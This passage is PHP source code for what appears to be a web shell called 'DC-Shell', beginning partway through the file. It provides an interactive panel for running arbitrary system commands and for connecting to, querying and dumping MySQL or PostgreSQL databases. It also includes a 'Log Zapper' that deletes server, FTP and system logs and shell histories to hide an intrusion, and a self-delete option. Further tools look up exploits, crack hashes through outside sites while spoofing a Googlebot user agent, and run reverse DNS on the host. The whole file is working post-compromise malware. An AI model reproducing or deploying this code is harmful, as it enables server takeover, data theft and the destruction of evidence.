            exit();
        }
        if ($_POST['query'] == "ExploitDB") {
            $exploit_query = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=&filter_exploit_text=" . $_POST['busqueda'] . "&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve";
        } elseif ($_POST['query'] == "Metasploit") {
            $exploit_query = "http://www.metasploit.com/search.jsp?cx=009245545489775321519%3Azlrrcrpwkkq&cof=FORID%3A10%3BNB%3A1&ie=UTF-8&q=" . $_POST['busqueda'];
        } elseif ($_POST['query'] == "CVS") {
            $exploit_query = "http://cvedetails.com/google-search-results.php?cx=partner-pub-9597443157321158%3Advjtec-wfv5&cof=FORID%3A9&ie=UTF-8&q=" . $_POST['query'] . "&sa=Search&siteurl=cvedetails.com%2Fcve-details.php%3Ft%3D1%26cve_id%3Dse&ref=cvedetails.com%2Fgoogle-search-results.php%3Fcx%3Dpartner-pub-9597443157321158%253Advjtec-wfv5%26cof%3DFORID%253A9%26ie%3DUTF-8%26q%3Di%2Bmean%26sa%3DSearch%26siteurl%3Dwww.cvedetails.com%252F%26ref%3Dwww.google.com.ar%252Furl%253Fsa%253Dt%2526rct%253Dj%2526q%253Dexploit%252520search%2526source%253Dweb%2526cd%253D10%2526ved%253D0CHwQFjAJ%2526url%253Dhttp%25253A%25252F%25252Fwww.cvedetails.com%25252F%2526ei%253DWhceUM36HIrc9ASs5ID4Aw%2526usg%253DAFQjCNHcIgItjbPQKDjBLeFw26ZXTNFdqg%2526cad%253Drja%26ss%3D835j159051j7&ss=222j26690j3";
        }
        echo "<meta http-equiv='refresh' content='0; url=$exploit_query'>";
    }
}
if (isset($_GET['sql'])) {
    checksession();
    if (isset($_SESSION['connected'])) {
        header("Location: ?dbmanager");
    }
    page("SQL", "auto");
    if (isset($_POST['connect'])) {
        if ($_POST['hostname'] == "") {
            echo $errormsg[7];
        } elseif ($_POST['user'] == "") {
            echo $errormsg[7];
        } elseif ($_POST['db'] == "") {
            echo $errormsg[7];
        } elseif ($_POST['pw'] == "") {
            echo $errormsg[7];
        } elseif ($_POST['pw'] == "") {
            echo $errormsg[7];
        }
        $dbhost      = $_POST['hostname'];
        $dbuser      = $_POST['user'];
        $dbpw        = $_POST['pw'];
        $dbport      = $_POST['port'];
        $db          = $_POST['db'];
        $dbtype      = $_POST['connection'];
        $hostandport = $dbhost . ":" . $dbport;
        
        if ($dbtype == "MySQL") {
            if (@mysql_connect($hostandport, $dbuser, $dbpw)) {
                session_start();
                $_SESSION['connected']   = true;
                $_SESSION['user']        = $dbuser;
                $_SESSION['db']          = $db;
                $_SESSION['hostandport'] = $hostandport;
                $_SESSION['host']        = $dbhost;
                $_SESSION['port']        = $dbport;
                $_SESSION['pw']          = $dbpw;
                $_SESSION['type']        = $dbtype;
                header("Location: ?dbmanager");
            } else {
                echo $errormsg[6];
            }
            
        } elseif ($dbtype == "PostgreSQL") {
            if (@pg_connect("host=$dbhost port=$dbport dbname=$db user=$dbuser password=$dbpw")) {
                session_start();
                $_SESSION['connected'] = true;
                $_SESSION['user']      = $dbuser;
                $_SESSION['db']        = $db;
                $_SESSION['host']      = $dbhost;
                $_SESSION['port']      = $dbport;
                $_SESSION['pw']        = $dbpw;
                $_SESSION['type']      = $dbtype;
                header("Location: ?dbmanager");
                
            } else {
                echo $errormsg[6];
            }
            
            
        }
        
    } else {
        echo "<h2><font color='white'>Database Connection</font></h2>";
        echo '<form name="dbform" action="" method="post"/>';
        fetchtype();
        echo "<table id ='user' width='400px'><tr><td><label><font color='white'>User</font></label><br /><input type='text' name='user' class='input'/><br/><td></tr></table>";
        echo "<table id ='database' width='400px'><tr><td><label><font color='white'>Database</font></label><br /><input type='text' name='db' class='input'/><br/><td></tr></table>";
        echo "<table id ='password' width='400px'><tr><td><label><font color='white'>Password</font></label><br /><input type='password' name='pw' class='input'/><br/><td></tr></table>";
        echo "<table id ='submit' width='400px'><tr><td><input type='submit' name='connect' class='submit' value='Connect'/></form></div></center></body></html>";
    }
}
if (isset($_GET['dbmanager'])) {
    checksession();
    if (isset($_POST['dbquery'])) {
        header("Location: ?query");
    }
    if (isset($_POST['quit'])) {
        unset($_SESSION['connected']);
        echo '<script>window.location = "?sql";</script>';
    }
    if (isset($_POST['dump'])) {
        header("Location: ?dumpdb");
    }
    if (!isset($_SESSION['connected'])) {
        header("Location: ?sql");
    }
    page("Database Manager", "auto");
    if ($_SESSION['type'] == "MySQL") {
        echo <<< HTML
<script>
function toggle() {
	var ele = document.getElementById("divquery");
	var text = document.getElementById("displayText");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = "show";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	}
}
</script>
HTML;
        @mysql_connect($_SESSION['hostandport'], $_SESSION['user'], $_SESSION['pw']);
        $database = $_SESSION['db'];
        echo "<h2><font color='white'>Database Manager</font></h2>";
        $res = mysql_query("SHOW TABLES FROM $database");
        echo '<form name="actions" action="" method="post">';
        echo "<input type='submit' name='dump' class='submit' value='Dump DB'/><input type='submit' name='dbquery' class='submit' value='Query'/><input type='submit' name='quit' class='submit' value='Quit'/>";
        echo '</form>';
        echo "<table id ='tables' width='400px'><tr><font color='white'>Tables:</font><td></tr></table>";
        while ($row = mysql_fetch_array($res, MYSQL_NUM)) {
            echo "<table id ='tables' class='tb' width='400px'><tr><td><a href=?GetColumns=$row[0]><font color='white'>$row[0]</font></a><br/><td></tr></table>";
        }
        
    } else {
        $host = $_SESSION['host'];
        $port = $_SESSION['port'];
        $db   = $_SESSION['db'];
        $user = $_SESSION['user'];
        $pw   = $_SESSION['pw'];
        @pg_connect("host=$host port=$port dbname=$db user=$user password=$pw");
        $pgtables = @pg_query("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'");
        echo "<form name='idk' action='' method='post'><input type='submit' name='dump' class='submit' value='Dump DB'/><input type='submit' name='dbquery' class='submit' value='Query'/><input type='submit' name='quit' class='submit' value='Quit'/></form>";
        if (isset($_POST['dbquery'])) {
            header("Location: ?query");
        }
        if (isset($_POST['quit'])) {
            unset($_SESSION['connected']);
            echo '<script>window.location = "?sql";</script>';
        }
        if (isset($_POST['dump'])) {
            header("Location: ?dumpdb");
        }
        echo "<table id ='tables' width='400px'><tr><font color='white'>Tables:</font><td></tr></table>";
        while ($row = @pg_fetch_row($pgtables)) {
            echo "<table id ='tables' class='tb' width='400px'><tr><td><a href=?GetColumns=$row[0]><font color='white'>$row[0]</font></a><br/><td></tr></table>";
        }
    }
    echo "</div></center></body></html>";
}
if (isset($_GET['GetColumns'])) {
    checksession();
    $host = $_SESSION['host'];
    $port = $_SESSION['port'];
    $db   = $_SESSION['db'];
    $user = $_SESSION['user'];
    $pw   = $_SESSION['pw'];
    if ($_SESSION['type'] == "MySQL") {
        @mysql_connect($_SESSION['hostandport'], $_SESSION['user'], $_SESSION['pw']);
        @mysql_select_db($_SESSION['db']);
        $request = mysql_real_escape_string($_GET['GetColumns']);
        session_start();
        $_SESSION['table'] = $request;
        $fields            = @mysql_query("SHOW COLUMNS FROM $request");
        $viewc             = @mysql_query("SELECT * FROM $request");
        page("Columns of $request", "auto");
        echo "<table id ='tables' width='100%'><tr><font color='white'>Columns:</font><td></tr></table>";
        echo "<table id ='columns' class='tb' style='max-width: 900px'><tr>";
        while ($lts = mysql_fetch_array($fields)) {
            echo "<td><font color='red'>$lts[Field]</font></td>";
        }
        echo "</tr>";
        $contar = @mysql_query("SHOW COLUMNS FROM $request") or die($errormsg[13]);
        $contar = @mysql_num_rows($contar) or die($errormsg[13]);
        while ($lts2 = mysql_fetch_array($viewc)) {
            echo "<tr>";
            error_reporting(0);
            for ($i = 0; $i < count($lts2); $i++) {
                echo "<td><font color='white'>$lts2[$i]</font></td>";
            }
            echo "</tr>";
        }
    } else {
        $requestx = @pg_escape_string($_GET['GetColumns']);
        $table    = $_SESSION['table'];
        page("Columns of $request", "auto");
        pg_connect("host=$host port=$port dbname=$db user=$user password=$pw");
        $pgcolumns = @pg_query("SELECT column_name FROM information_schema.columns WHERE table_name ='$requestx'");
        echo "<table id ='col' width='100%'><tr><font color='white'>Columns:</font><td></tr></table>";
        echo "<table id ='columns' class='tb' style='max-width: 900px'><tr>";
        while ($row = @pg_fetch_array($pgcolumns)) {
            echo "<td><font color='red'>$row[0]</font></td>";
        }
        echo "</tr>";
    }
    $fetchcontent = @pg_query("SELECT * FROM $requestx");
    while ($lts2 = @pg_fetch_array($fetchcontent)) {
        echo "<tr>";
        for ($i = 0; $i < 5; $i++) {
            echo "<td><font color='white'>$lts2[$i]</font></td>";
        }
        echo "</tr>";
    }
    echo "</tr></table></div></center></body></html>";
}
/*
-> To do

if (isset($_GET['EditColumn'])){
checksession();
if ($_SESSION['type'] == "MySQL"){
@mysql_connect($_SESSION['hostandport'], $_SESSION['user'], $_SESSION['pw']);
@mysql_select_db($_SESSION['db']) ;
$table = $_SESSION['table'];
$ColumnFetched = $_GET['EditColumn'];
page("Edit Column", "auto");
echo '<form action="" method="post">';
echo "<textarea name='textarea' cols='100' rows='10'>$ColumnFetched</textarea><br/>";
echo "<input type='submit' name='editc' class='submit' value='Edit'/>";
if (isset($_POST['editc'])){
$set = $_POST['textarea'];
$query = "UPDATE $table SET `nombre` = '$set'";
if (mysql_query($query)) {
header ("Location: ?GetColumns=$table");
}
} elseif($_SESSION['type'] == "PostgreSQL") {
page("Edit column", "auto");
@pg_connect("host=$host port=$port dbname=$db user=$user password=$pw");
$table = $_SESSION['table'];
$ColumnFetched = $_GET['EditColumn'];
echo '<form action="" method="post">';
echo "<textarea name='textarea' cols='100' rows='10'>$ColumnFetched</textarea><br/>";
echo "<input type='submit' name='editc' class='submit' value='Edit'/>";
if (isset($_POST['editc'])){
$set = $_POST['textarea'];
$query = "UPDATE $table SET $ColumnFetched = '$set'";
if (@pg_query($query)) {
header ("Location: ?GetColumns=$table");
}
echo "</form></div></center></body></html>";
}
}
}
}
*/
if (isset($_GET['phpinfo'])) {
    checksession();
    phpinfo();
}
if (isset($_GET['zapper'])) {
    checksession();
    $user           = get_current_user();
    $webserver_logs = array(
        '/var/log/apache2/error.log',
        '/var/log/apache/error.log',
        '/var/log/apache2/access.log',
        '/var/log/apache/access.log',
        '/var/log/httpd/access_log',
        '/var/log/httpd-access.log',
        '/var/log/httpd/error_log',
        '/var/log/httpd/domains/',
        '/var/log/messages',
        'C:\windows\system32\LogFiles\W3SVC1',
        'C:\WINDOWS\system32\LogFiles',
        '/var/log/httpd-error.log',
        '/var/log/lighttpd/*',
        '/var/log/httpd-error.log'
    );
    $ftp_logs       = array(
        '/var/log/proftpd/access.log',
        '/var/log/proftpd/auth.log',
        '/var/log/messages',
        '/var/log/vsftpd.log',
        '/var/log/pureftpd.log'
    );
    $system_logs    = array(
        '/var/log/auth.log',
        '/var/log/telnetd',
        '/var/log/messages',
        '/var/log/lastlog',
        '/var/log/auth.log.1',
        '/var/log/auth.log.2',
        '/var/log/utmp',
        '/var/log/wtmp',
        '/var/log/secure',
        '/var/log/mysqld.log',
        'C:\WINDOWS\system32\LogFiles',
        '/var/log/mail',
        "/home/$user/.bash_history",
        "/home/$user/.mysql_history",
        '/root/.bash_history',
        '/root/.ksh_history',
        '/root/.mysql_history',
        '/root/.ksh_history',
        "/home/$user/.bash_logout",
        '/root/.bash_logout',
        '/var/log/faillog',
        '/root/.ksh_history',
        '/etc/wtmp',
        '/root/.ksh_history'
    );
    if (!isset($_POST['dlogs'])) {
        page("Log Zapper", "auto");
        echo "<form action='' method='post'>";
        echo "<font color='white'><h2>Log Zapper</h2>";
        echo '<center><label>WebServer logs<input type="radio" name="option" value="wserverlogs" /> || </label>';
        echo '<label>FTPd logs</label><input type="radio" name="option" value="ftplogs" /> || ';
        echo '<label>System logs</label><input type="radio" name="option" value="systemlogs" /><br/>';
        echo "<textarea name='output' cols='50' rows='10'>";
        echo "</textarea><br/>";
        echo '<input type="submit" class="submit" name="dlogs" value="Clean logs"/></font></center>';
        echo "</form></div></center></body></html>";
    } else {
        error_reporting(0);
        $option_log = $_POST['option'];
        if ($option_log == "wserverlogs") {
            page("Log Zapper", "auto");
            echo "<form action='' method='post'>";
            echo "<font color='white'><h2>Log Zapper</h2>";
            echo '<center><label>WebServer logs<input type="radio" name="option" value="wserverlogs" /> ||</label>';
            echo '<label>FTPd logs</label><input type="radio" name="option" value="ftplogs" /> ||';
            echo '<label>System logs</label><input type="radio" name="option" value="systemlogs" /><br/>';
            echo "<textarea name='output' cols='50' rows='10'>";
            $countArray = count($webserver_logs);
            for ($i = 0; $i < $countArray; $i++) {
                if (@unlink($webserver_logs[$i])) {
                    echo "Deleting $webserver_logs[$i]" . "\n";
                } else {
                    echo "Can't delete $webserver_logs[$i]" . "\n";
                }
            }
            echo "</textarea><br/>";
            echo '<input type="submit" class="submit" name="dlogs" value="Clean logs"/></font></center>';
            echo "</form></div></center></body></html>";
        } elseif ($option_log == "ftplogs") {
            page("Log Zapper", "auto");
            echo "<form action='' method='post'>";
            echo "<font color='white'><h2>Log Zapper</h2>";
            echo '<center><input type="radio" name="option" value="wserverlogs" /><label>WebServer logs</label> || ';
            echo '<input type="radio" name="option" value="ftplogs" /><label>FTPd logs</label> || ';
            echo '<input type="radio" name="option" value="systemlogs" /><label>System logs</label><br />';
            echo "<textarea name='output' cols='50' rows='10'>";
            $countArray = count($ftp_logs);
            for ($i = 0; $i < $countArray; $i++) {
                if (@unlink($ftp_logs[$i])) {
                    echo "Deleting $ftp_logs[$i]" . "\n";
                } else {
                    echo "Can't delete $ftp_logs[$i]" . "\n";
                }
            }
            echo "</textarea><br/>";
            echo '<input type="submit" class="submit" name="dlogs" value="Clean logs"/></font></center>';
            echo "</form></div></center></body></html>";
        } elseif ($option_log == "systemlogs") {
            page("Log Zapper", "auto");
            echo "<form action='' method='post'>";
            echo "<font color='white'><h2>Log Zapper</h2>";
            echo '<center><input type="radio" name="option" value="wserverlogs" /><label>WebServer logs</label> || ';
            echo '<input type="radio" name="option" value="ftplogs" /><label>FTPd logs</label> || ';
            echo '<input type="radio" name="option" value="systemlogs" /><label>System logs</label><br />';
            echo "<textarea name='output' cols='50' rows='10'>";
            $countArray = count($system_logs);
            for ($i = 0; $i < $countArray; $i++) {
                if (@unlink($system_logs[$i])) {
                    echo "Deleting $system_logs[$i]" . "\n";
                } else {
                    echo "Can't delete $system_logs[$i]" . "\n";
                }
            }
            echo "</textarea><br/>";
            echo '<input type="submit" class="submit" name="dlogs" value="Clean logs"/></font></center>';
            echo "</form></div></center></body></html>";
        } else {
            page("Log Zapper", "auto");
            echo "<form action='' method='post'>";
            echo "<font color='white'><h2>Log Zapper</h2>";
            echo '<center><input type="radio" name="option" value="wserverlogs" /><label>WebServer logs</label> || ';
            echo '<input type="radio" name="option" value="ftplogs" /><label>FTPd logs</label> || ';
            echo '<input type="radio" name="option" value="systemlogs" /><label>System logs</label><br />';
            echo "<textarea name='output' cols='50' rows='10'>Select a valid option</textarea><br/>";
            echo '<input type="submit" class="submit" name="dlogs" value="Clean logs"/></font></center></form></div></center></body></html>';
        }
    }
}
if (isset($_GET['hash'])) {
    checksession();
    error_reporting(0);
    if (!isset($_POST['hashbutton'])) {
        page("Encrypt/Decrypt", "auto");
        echo "<h2><font color='white'>Encrypt/Decrypt</font></h2>";
        echo '<form action="" method="post">';
        echo '<input type="radio" name="option" value="MD5" /><label>MD5</label>';
        echo '<input type="radio" name="option" value="SHA1" /><label>SHA1</label>';
        echo '<input type="radio" name="option" value="base64" /><label>Base 64</label><br />';
        echo '<input type="text" name="input" style="background-color: #000000; border: 1px dashed green; border-radius: 4px; color: white;" size="35" value="Insert your hash here"/><br/>';
        echo '<input type="submit" name="hashbutton" class="submit" value="Encrypt"/><input type="submit" name="hashbutton" class="submit" value="Decrypt"/></form></div></center></body></html>';
    } else {
        if ($_POST['hashbutton'] == "Encrypt") {
            if ($_POST['option'] == "MD5") {
                $hashencrypted = md5($_POST['input']);
            } elseif ($_POST['option'] == "SHA1") {
                $hashencrypted = sha1($_POST['input']);
            } elseif ($_POST['option'] == "base64") {
                $hashencrypted = base64_encode($_POST['input']);
            }
            page("Encrypt/Decrypt", "auto");
            echo "<h2><font color='white'>Encrypt/Decrypt</font></h2>";
            echo '<form action="" method="post">';
            echo '<input type="radio" name="option" value="MD5" /><label>MD5</label>';
            echo '<input type="radio" name="option" value="SHA1" /><label>SHA1</label>';
            echo '<input type="radio" name="option" value="base64" /><label>Base 64</label><br />';
            echo "<input type='text' name='input' style='background-color: #000000; border: 1px dashed green; border-radius: 4px; color: white;' size='35' value='" . $hashencrypted . "'/><br/>";
            echo '<input type="submit" name="hashbutton" class="submit" value="Encrypt"/><input type="submit" name="hashbutton" class="submit" value="Decrypt"/></form></div></center></body></html>';
        } else {
            if ($_POST['hashbutton'] == "Decrypt") {
                if ($_POST['option'] == "MD5") {
                    $input      = $_POST['input'];
                    $parameters = 'string=' . urlencode($input) . '&submit=' . urlencode("Decrypt");
                    $ch         = curl_init();
                    @curl_setopt($ch, CURLOPT_URL, 'http://www.stringfunction.com/md5-decrypter.html');
                    @$userAgent = 'Googlebot/2.1 (http://www.googlebot.com/bot.html)';
                    @curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
                    @curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                        "Accept-Language: es-es,en"
                    ));
                    @curl_setopt($ch, CURLOPT_POST, true);
                    @curl_setopt($ch, CURLOPT_POSTFIELDS, $parameters);
                    @curl_setopt($ch, CURLOPT_HEADER, false);
                    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                    $save  = @curl_exec($ch);
                    $error = @curl_error($ch);
                    @curl_close($ch);
                    @preg_match_all('(<textarea class="textarea-input-tool-b" rows="10" cols="50" name="result" id="textarea_md5_decrypter">(.*)</textarea>)siU', $save, $result_md5);
                    if (!$result_md5[1][0] == "") {
                        $hashdecrypted = $result_md5[1][0];
                    } else {
                        $hashdecrypted = "No Results";
                    }
                } elseif ($_POST['option'] == "SHA1") {
                    $input      = $_POST['input'];
                    $parameters = 'string=' . urlencode($input) . '&submit=' . urlencode("Decrypt");
                    $ch         = @curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'http://www.stringfunction.com/sha1-decrypter.html');
                    $userAgent = 'Googlebot/2.1 (http://www.googlebot.com/bot.html)';
                    @curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
                    @curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                        "Accept-Language: es-es,en"
                    ));
                    @curl_setopt($ch, CURLOPT_POST, true);
                    @curl_setopt($ch, CURLOPT_POSTFIELDS, $parameters);
                    @curl_setopt($ch, CURLOPT_HEADER, false);
                    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                    $save  = curl_exec($ch);
                    $error = curl_error($ch);
                    curl_close($ch);
                    preg_match_all('(<textarea class="textarea-input-tool-b" rows="10" cols="50" name="result">(.*)</textarea>)siU', $save, $result_md5);
                    if (!$result_md5[1][0] == "") {
                        $hashdecrypted = $result_md5[1][0];
                    } else {
                        $hashdecrypted = "No Results";
                    }
                    
                } elseif ($_POST['option'] == "base64") {
                    $hashdecrypted = base64_decode($_POST['input']);
                }
                page("Encrypt/Decrypt", "auto");
                echo "<h2><font color='white'>Encrypt/Decrypt</font></h2>";
                echo '<form action="" method="post">';
                echo '<input type="radio" name="option" value="MD5" /><label>MD5</label>';
                echo '<input type="radio" name="option" value="SHA1" /><label>SHA1</label>';
                echo '<input type="radio" name="option" value="base64" /><label>Base 64</label><br />';
                echo "<input type='text' name='input' style='background-color: #000000; border: 1px dashed green; border-radius: 4px; color: white;' size='35' value='" . $hashdecrypted . "'/><br/>";
                echo '<input type="submit" name="hashbutton" class="submit" value="Encrypt"/><input type="submit" name="hashbutton" class="submit" value="Decrypt"/></form></div></center></body></html>';
            }
        }
    }
}
if (isset($_GET['execute'])) {
    checksession();
    if (!isset($_POST['sendcommand'])) {
        page("Execute Commands", "auto");
        echo "<center><font color='white'><h2>Interactive Shell</h2></font></center>";
        echo "<div id='terminal' name='terminal'>";
        echo "<textarea name='output' cols='100' rows='20' style='border: 1px black solid; overflow-y:scroll'>";
        echo "Welcome to DC-Shell, ¡Enjoy it!" . "\n\n";
        echo "</textarea><form action='' method='post'><label><font size='1'>" . '[' . get_current_user() . '@' . php_uname('n') . ']$ </font>' . "<input type='text' name='command' style='background-color: #000000; color: white; border: none;' size='80'/><input type='submit' name='sendcommand'style='width: 1px; height: 1px; background-color: #000000; color: #000000; border: none;'/>";
        echo "</pre></form></div></div></body></html>";
    } else {
        page("Execute Commands", "auto");
        $command = strip_tags($_POST['command']);
        echo "<center><font color='white'><h2>Interactive Shell</h2></font></center>";
        echo "<div id='terminal' name='terminal'>";
        echo "<textarea name='output' cols='100' rows='20' style='border: 1px black solid; overflow-y:scroll'>";
        echo "Welcome to DC-Shell, ¡Enjoy it!" . "\n\n";
        ;
        echo "</textarea><form action='' method='post'><font color='black'><p>" . @passthru(@system($command)) . "</p></font><label><font size='1'>" . '[' . get_current_user() . '@' . php_uname('n') . ']$ </font>' . "<input type='text' name='command' style='background-color: #000000; color: white; border: none;' size='80'/><input type='submit' name='sendcommand'style='width: 1px; height: 1px; background-color: #000000; color: #000000; border: none;'/>";
        echo "</pre></form></div></div></body></html>";
    }
}
if (isset($_GET['query'])) {
    checksession();
    if (!isset($_SESSION['connected'])) {
        header("Location: ?sql");
    }
    if (!isset($_POST['execute'])) {
        page("SQL Query", "auto");
        echo '<form id="666" action="" method="post">';
        echo '<textarea name="this" class="textarea" cols="50" rows="10"></textarea><br/>';
        echo '<input type="submit" class="submit" name="execute" value="Execute"/>';
        echo "</form></div></body></html>";
    } else {
        page("SQL Query", "auto");
        if ($_SESSION['type'] == "MySQL") {
            @mysql_connect($_SESSION['hostandport'], $_SESSION['user'], $_SESSION['pw']);
            @mysql_select_db($_SESSION['db']);
            $iwannasleepsadface = @mysql_real_escape_string($_POST['this']);
            $query              = @mysql_query($iwannasleepsadface);
            echo '<form id="666" action="" method="post">';
            echo "<textarea name='this' class='textarea' cols='50' rows='10'>";
            while ($row = @mysql_fetch_array($query)) {
                echo $row[0] . "\n";
            }
            echo "</textarea><br/>";
            echo '<input type="submit" class="submit" name="execute" value="Execute"/>';
        } else {
            $host = $_SESSION['host'];
            $port = $_SESSION['port'];
            $db   = $_SESSION['db'];
            $user = $_SESSION['user'];
            $pw   = $_SESSION['pw'];
            @pg_connect("host=$host port=$port dbname=$db user=$user password=$pw");
            echo '<form id="666" action="" method="post">';
            echo "<textarea name='this' class='textarea' cols='50' rows='10'>";
            $iwannasleepsadface = @pg_escape_string($_POST['this']);
            $query              = @pg_query($iwannasleepsadface);
            while ($row = @pg_fetch_array($query)) {
                echo $row[0] . "\n";
            }
            echo "</textarea><br/>";
            echo '<input type="submit" class="submit" name="execute" value="Execute"/>';
            echo "</form></div></body></html>";
        }
    }
}
if (isset($_GET['dumpdb'])) {
    checksession();
    if ($_SESSION['type'] == "MySQL") {
        @mysql_connect($_SESSION['hostandport'], $_SESSION['user'], $_SESSION['pw']);
        @mysql_select_db($_SESSION['db']);
        $tableName  = '*';
        $backupFile = 'dumpmysql.sql';
        /* backup the db OR just a table */
        function backup_tables($host, $user, $pass, $name, $tables = '*')
        {
            $link = @mysql_connect($host, $user, $pass);
            @mysql_select_db($name, $link);
            
            //get all of the tables
            if ($tables == '*') {
                $tables = array();
                $result = @mysql_query('SHOW TABLES');
                while ($row = @mysql_fetch_row($result)) {
                    $tables[] = $row[0];
                }
            } else {
                $tables = is_array($tables) ? $tables : explode(',', $tables);
            }
            
            //cycle through
            foreach ($tables as $table) {
                $result     = @mysql_query('SELECT * FROM ' . $table);
                $num_fields = @mysql_num_fields($result);
                
                @$return .= 'DROP TABLE ' . $table . ';';
                $row2 = @mysql_fetch_row(mysql_query('SHOW CREATE TABLE ' . $table));
                $return .= "\n\n" . $row2[1] . ";\n\n";
                
                for ($i = 0; $i < $num_fields; $i++) {
                    while ($row = @mysql_fetch_row($result)) {
                        $return .= 'INSERT INTO ' . $table . ' VALUES(';
                        for ($j = 0; $j < $num_fields; $j++) {
                            $row[$j] = addslashes($row[$j]);
                            $row[$j] = ereg_replace("\n", "\\n", $row[$j]);
                            if (isset($row[$j])) {
                                $return .= '"' . $row[$j] . '"';
                            } else {
                                $return .= '""';
                            }
                            if ($j < ($num_fields - 1)) {
                                $return .= ',';
                            }
                        }
                        $return .= ");\n";
                    }
                }
                $return .= "\n\n\n";
            }
            
            //save file
            $handle = fopen('dumpmysql.sql', 'w+');
            fwrite($handle, $return);
            fclose($handle);
        }
        backup_tables($_SESSION['hostandport'], $_SESSION['user'], $_SESSION['db'], $_SESSION['pw']);
        @header('Content-Type: application/force-download');
        @header('Content-Disposition: attachment; filename="dumpmysql.sql"');
        @readfile("dumpmysql.sql");
    } elseif ($_SESSION['type'] == "PostgreSQL") {
        $host = $_SESSION['host'];
        $port = $_SESSION['port'];
        $db   = $_SESSION['db'];
        $user = $_SESSION['user'];
        $pw   = $_SESSION['pw'];
        @pg_connect("host=$host port=$dbport dbname=$db password=$dbpw");
        @system("pg_dump $db -U $user > dump-postgresql.sql");
        @header('Content-Type: application/force-download');
        @header('Content-Disposition: attachment; filename="dump-postgresql.sql"');
        @readfile("dump-postgresql.sql");
    }
}
if (isset($_GET['reversedns'])) {
    checksession();
    page("Reverse DNS", "auto");
    $hostt      = $_SERVER['SERVER_NAME'];
    $parameters = 'host=' . urlencode("$hostt") . '&submit=' . urlencode("Reverse IP");
    $ch         = @curl_init();
    @curl_setopt($ch, CURLOPT_URL, 'http://www.ip-adress.com/reverse_ip/');
    $userAgent = 'Googlebot/2.1 (http://www.googlebot.com/bot.html)';
    @curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    @curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Accept-Language: es-es,en"
    ));
    @curl_setopt($ch, CURLOPT_POST, true);
    @curl_setopt($ch, CURLOPT_POSTFIELDS, $parameters);
    @curl_setopt($ch, CURLOPT_HEADER, false);
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $save  = @curl_exec($ch);
    $error = @curl_error($ch);
    @curl_close($ch);
    @preg_match_all('(<a href="/ip_addresses/[^>]*">(.*)</a>)siU', $save, $ip);
    @preg_match_all('(<img src="/flags/(.*)" alt="ip address flag">)siU', $save, $flag);
    @preg_match_all('/<td style="font-size:8pt">[^>]*<a href="(.*)">/', $save, $re2);
    foreach ($re2 as $f2) {
        $f2 = str_replace("/whois/", "", $f2);
        if ($f2 == "") {
            $f2 = "No Hosts";
        }
    }
    @ob_start;
    if (@ini_get("safe_mode") == 1) {
        echo $errormsg[21];
        exit();
    }
    @ob_implicit_flush(TRUE);
    echo "<h2><font color='white'>Reverse DNS</font></h2>";
    echo "<center><font color='white'>Provided by <a href='http://www.ip-adress.com' rel='nofollow'>IP-A<font color='red'><strike>d</strike></font>dress.com</a></font></center>";
    echo '<table border="0" class="tb">';
    echo "<tr><td><font color='white'><b>IP Address: </b>" . @$ip[1][0] . "</font></td></tr>";
    echo "<tr><td><font color='white'><b>Location: </b><img src='http://www.ip-adress.com/flags/" . @$flag[1][0] . "'></font></td></tr>";
    echo "<tr><td><font color='white'><b>Hosts: </b></font></td></tr>";
    for ($i = 0; $i < count($re2[0]); $i++) {
        echo "<tr><td><font color='white'>" . $f2[$i] . "</font></td></tr>";
    }
    echo "</tr></table></div></body></html>";
}
if (isset($_GET['suicide'])) {
    checksession();
    if (!@unlink(__FILE__)) {
        page("Error", "auto");
        echo $errormsg[11];
        echo "</div></body></html>";
    }
}
?>